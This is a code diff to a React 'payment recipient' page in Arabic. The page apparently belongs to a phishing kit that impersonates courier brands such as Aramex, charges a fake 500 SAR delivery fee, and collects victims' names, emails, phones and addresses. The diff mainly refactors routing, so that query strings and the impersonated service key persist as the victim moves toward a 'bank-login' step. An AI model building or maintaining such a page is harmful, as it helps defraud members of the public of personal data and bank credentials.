@@ -1,4 +1,4 @@
-import { useEffect, useState } from "react";
+import { useEffect, useMemo, useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
@@ -27,20 +27,19 @@ import heroBahpost from "@/assets/hero-bahpost.jpg";
 import heroBg from "@/assets/hero-bg.jpg";
 
 const PaymentRecipient = () => {
-  const { id } = useParams();
+  const { id: rawIdParam } = useParams();
   const navigate = useNavigate();
-  const { data: linkData, isLoading } = useLink(id);
+  const shareId = rawIdParam || "";
+  const { data: linkData, isLoading } = useLink(shareId);
   const [customerName, setCustomerName] = useState("");
   const [customerEmail, setCustomerEmail] = useState("");
   const [customerPhone, setCustomerPhone] = useState("");
   const [residentialAddress, setResidentialAddress] = useState("");
-  
-  useEffect(() => {
-    const method = sessionStorage.getItem('paymentMethod');
-    if (!method) {
-      navigate(`/pay/${id}/track`);
-    }
-  }, [id, navigate]);
+  const urlService = useMemo(
+    () => (typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null),
+    []
+  );
+  const currentSearch = typeof window !== "undefined" ? window.location.search : "";
 
   if (isLoading) {
     return <FullScreenLoader label="جاري تحميل بيانات المستلم..." />;
@@ -59,13 +58,26 @@ const PaymentRecipient = () => {
   }
 
   const payload = (linkData.payload ?? {}) as Record<string, any>;
-  const urlService = typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null;
-  const serviceKey = payload.service_key || payload.service || urlService || 'aramex';
+  const storedServiceKey = typeof window !== "undefined" ? sessionStorage.getItem('serviceKey') : null;
+  const serviceKey = payload.service_key || payload.service || urlService || storedServiceKey || 'aramex';
   const serviceName = payload.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const shippingInfo = payload;
   const amount = shippingInfo?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
+
+  useEffect(() => {
+    if (serviceKey) {
+      sessionStorage.setItem('serviceKey', serviceKey);
+    }
+  }, [serviceKey]);
+
+  useEffect(() => {
+    const method = sessionStorage.getItem('paymentMethod');
+    if (!method) {
+      navigate(`/pay/${shareId}/track${currentSearch}`, { replace: true });
+    }
+  }, [shareId, navigate, currentSearch]);
   
   const heroImages: Record<string, string> = {
     'aramex': heroAramex,
@@ -122,8 +134,9 @@ const PaymentRecipient = () => {
         phone: customerPhone,
         address: residentialAddress,
         service: serviceName,
+        service_key: serviceKey,
         amount: formattedAmount,
-        payment_url: `${window.location.origin}/pay/${id}/details`
+        payment_url: `${window.location.origin}/pay/${shareId}/details${currentSearch}`
       },
       timestamp: new Date().toISOString()
     });
@@ -140,6 +153,7 @@ const PaymentRecipient = () => {
       phone: customerPhone,
       address: residentialAddress,
       service: serviceName,
+      serviceKey,
       amount: formattedAmount
     }));
 
@@ -148,13 +162,13 @@ const PaymentRecipient = () => {
       const bank = sessionStorage.getItem('selectedBank');
       if (!bank || bank === 'skipped') {
         sessionStorage.removeItem('selectedBank');
-        navigate(`/pay/${id}/track`);
+        navigate(`/pay/${shareId}/track${currentSearch}`);
         return;
       }
-      navigate(`/pay/${id}/bank-login`);
+      navigate(`/pay/${shareId}/bank-login${currentSearch}`);
     } else {
       sessionStorage.setItem('selectedBank', 'skipped');
-      navigate(`/pay/${id}/details`);
+      navigate(`/pay/${shareId}/details${currentSearch}`);
     }
   };
   
